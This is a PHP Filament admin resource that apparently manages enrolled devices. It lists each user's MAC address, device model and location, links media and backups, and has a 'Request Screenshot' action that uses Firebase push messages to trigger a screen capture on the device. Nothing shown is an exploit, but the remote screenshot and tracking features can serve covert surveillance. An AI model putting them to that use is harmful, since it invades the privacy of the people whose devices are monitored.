<?php

namespace App\Filament\Resources;

use App\Filament\Resources\UserResource\Pages;
use App\Filament\Resources\UserResource\RelationManagers;
use App\Models\User;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class UserResource extends Resource
{
    protected static ?string $model = User::class;

    protected static ?string $navigationIcon = 'heroicon-o-rectangle-stack';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                Forms\Components\TextInput::make('name')
                    ->required(),
                Forms\Components\TextInput::make('email')
                    ->email(),
                Forms\Components\DateTimePicker::make('email_verified_at'),
                Forms\Components\TextInput::make('password')
                    ->password(),
                Forms\Components\TextInput::make('device_id'),
                Forms\Components\TextInput::make('mac_address'),
                Forms\Components\TextInput::make('model'),
                Forms\Components\TextInput::make('location'),
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('name')
                    ->searchable(),
                Tables\Columns\TextColumn::make('email')
                    ->searchable(),
                Tables\Columns\TextColumn::make('email_verified_at')
                    ->dateTime()
                    ->sortable(),
                Tables\Columns\TextColumn::make('created_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('updated_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('device_id')
                    ->searchable(),
                Tables\Columns\TextColumn::make('mac_address')
                    ->searchable(),
                Tables\Columns\TextColumn::make('model')
                    ->searchable(),
                Tables\Columns\TextColumn::make('location')
                    ->searchable(),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
                Tables\Actions\Action::make('request_screenshot')
                    ->label('Request Screenshot')
                    ->icon('heroicon-o-camera')
                    ->requiresConfirmation()
                    ->action(function (User $record) {
                        if (!$record->fcm_token) {
                            \Filament\Notifications\Notification::make()
                                ->title('No FCM Token')
                                ->body('This device does not have an FCM token.')
                                ->danger()
                                ->send();
                            return;
                        }

                        try {
                            // Path to credentials
                            $credentialsPath = storage_path('app/firebase_credentials.json');
                            if (!file_exists($credentialsPath)) {
                                throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
                            }

                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                            $projectId = $jsonKey['project_id'];

                            // Get Access Token
                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                'https://www.googleapis.com/auth/firebase.messaging',
                                $credentialsPath
                            );
                            $token = $credentials->fetchAuthToken();

                            // Send FCM
                            $client = new \GuzzleHttp\Client();
                            $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                'headers' => [
                                    'Authorization' => 'Bearer ' . $token['access_token'],
                                    'Content-Type' => 'application/json',
                                ],
                                'json' => [
                                    'message' => [
                                        'token' => $record->fcm_token,
                                        'data' => [
                                            'action' => 'screenshot',
                                        ],
                                    ],
                                ],
                            ]);

                            \Filament\Notifications\Notification::make()
                                ->title('Screenshot Requested')
                                ->success()
                                ->send();

                        } catch (\Exception $e) {
                             \Filament\Notifications\Notification::make()
                                ->title('Failed to Request Screenshot')
                                ->body($e->getMessage())
                                ->danger()
                                ->send();
                        }
                    }),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            RelationManagers\MediaRelationManager::class,
            RelationManagers\BackupsRelationManager::class,
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListUsers::route('/'),
            'create' => Pages\CreateUser::route('/create'),
            'edit' => Pages\EditUser::route('/{record}/edit'),
        ];
    }
}
